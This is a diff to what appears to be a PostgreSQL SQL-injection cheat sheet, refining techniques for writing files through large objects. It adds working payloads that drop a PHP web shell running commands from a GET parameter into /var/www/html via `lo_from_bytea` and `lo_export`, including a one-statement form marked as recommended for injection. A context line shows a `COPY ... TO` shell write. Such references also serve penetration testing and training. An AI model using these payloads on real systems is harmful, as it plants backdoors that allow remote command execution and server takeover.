@@ -59,26 +59,26 @@ COPY (SELECT '<?=`$_GET[0]`?>') TO '/var/www/html/s.php';
 
 Large objects can be used for file operations.
 
-**Note:** Use `lo_create(0)` to auto-generate a unique OID instead of specifying a fixed value, which can conflict with existing objects. Always clean up with `lo_unlink(<oid>)` after use to avoid resource leakage.
+**Note:** Use `lo_create(0)` to auto-generate a unique OID instead of specifying a fixed value, which can conflict with existing objects. The returned OID is session-scoped—it persists in `pg_largeobject` but you must capture and reuse it within the same connection. In injection contexts where you cannot reliably chain queries with captured values, use the DO block shown below. Always clean up with `lo_unlink()` after use to avoid resource leakage.
 
 ```sql
 -- Step 1: Create large object with auto-generated OID
 SELECT lo_create(0);
--- Returns OID (e.g., 16384) - note this value for subsequent steps
+-- Returns: 16384 (example OID - your value will differ)
 
--- Step 2: Insert content using returned OID (substitute actual OID)
-INSERT INTO pg_largeobject VALUES (<oid>, 0, decode('3c3f706870207379...', 'hex'));
+-- Step 2: Insert content using the returned OID from step 1
+INSERT INTO pg_largeobject VALUES (16384, 0, decode('3c3f706870207379...', 'hex'));
 
 -- Step 3: Export to file
-SELECT lo_export(<oid>, '/var/www/html/shell.php');
+SELECT lo_export(16384, '/var/www/html/shell.php');
 
 -- Step 4: Clean up to avoid resource leakage
-SELECT lo_unlink(<oid>);
+SELECT lo_unlink(16384);
 ```
 
-In interactive clients (psql, pgAdmin), copy the OID from step 1's output and substitute it into steps 2-4. For injection contexts, use the DO block below which handles OID capture automatically.
+The above works in interactive clients (psql, pgAdmin) where you can manually substitute the OID. For SQL injection contexts where stacked queries execute independently and you cannot capture intermediate results, use the DO block below which handles OID capture automatically in a single atomic operation.
 
-**Alternative: Single-shot with DO block:**
+**Recommended for injection: Single-shot with DO block:**
 
 ```sql
 DO $$
@@ -93,13 +93,16 @@ END $$;
 
 ### Using lo_from_bytea() (PostgreSQL 9.4+)
 
-```sql
--- Create large object from bytea
-SELECT lo_from_bytea(0, '<?php system($_GET["cmd"]); ?>'::bytea);
--- Returns OID
+For injection contexts, nest the calls to avoid OID capture issues:
 
--- Export to file
-SELECT lo_export(<oid>, '/var/www/html/shell.php');
+```sql
+-- Single-statement: create and export in one call (recommended for injection)
+SELECT lo_export(lo_from_bytea(0, '<?php system($_GET["cmd"]); ?>'::bytea), '/var/www/html/shell.php');
+
+-- Interactive usage (two separate statements):
+SELECT lo_from_bytea(0, '<?php system($_GET["cmd"]); ?>'::bytea);
+-- Returns: 16385 (example OID)
+SELECT lo_export(16385, '/var/www/html/shell.php');
 ```
 
 ### COPY TO PROGRAM
